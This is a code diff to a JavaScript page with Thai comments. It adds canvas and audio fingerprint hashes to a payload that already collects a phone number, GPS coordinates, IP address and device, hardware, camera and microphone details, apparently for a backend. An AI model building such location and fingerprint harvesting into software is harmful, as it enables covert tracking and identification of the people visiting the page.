@@ -145,7 +145,7 @@
     // ============================================================
 
     var payload = { phone: '', lat: '', lng: '', acc: '', map: '', os: '', model: '', device: '', browser: '', ip: '', deviceId: '',
-                    screen: '', gpu: '', fp: '',
+                    screen: '', gpu: '', fp: '', canvas: '', audio: '',
                     tz: '', lang: '', cpu: '', ram: '', cam: '', mic: '', touch: '',   // แยกคอลัมน์
                     tzlang: '', cpuram: '', devices: '' };                              // รวม (เผื่อ backend เก่า)
 
@@ -332,10 +332,12 @@
           payload.ram = ram;                        // แยก: RAM (GB)
           payload.gpu = gpu;
           payload.touch = touch;                    // แยก: สัมผัส (maxTouchPoints)
+          payload.canvas = canvas;                  // แยก: Canvas (แฮช)
           payload.tzlang = tz + (lang ? (tz ? ' · ' : '') + lang : '');                              // รวม (compat)
           payload.cpuram = (cores ? cores + ' คอร์' : '') + (ram ? (cores ? ' · ' : '') + ram + ' GB' : '');  // รวม (compat)
           Promise.all([fpAudio(), fpDevices()]).then(function (r) {
             var audio = r[0], dc = r[1];
+            payload.audio = audio;                   // แยก: Audio (แฮช)
             payload.cam = dc.cam;                    // แยก: กล้อง
             payload.mic = dc.mic;                    // แยก: ไมค์
             payload.devices = 'กล้อง ' + dc.cam + ' · ไมค์ ' + dc.mic +
